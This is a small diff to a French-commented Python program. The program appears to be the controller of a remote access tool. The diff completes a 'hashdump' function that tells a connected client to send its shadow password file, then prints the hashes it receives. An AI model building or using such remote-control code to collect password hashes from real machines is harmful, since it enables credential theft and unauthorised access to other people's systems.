@@ -155,6 +155,8 @@ def search(client_socket) :
 # Fonction permettant de récupérer le fichier shadow du client
 def hashdump(client_socket):
     client_socket.send(b'hashdump')  # Envoie de la commande
+    hashdump_received = client_socket.recv(4096).decode()  # Récupération des données hashdump
+    print(f'\n{hashdump_received}')  # Affichage des données hashdump
 
 def main():
     # Récupération et définition des variables
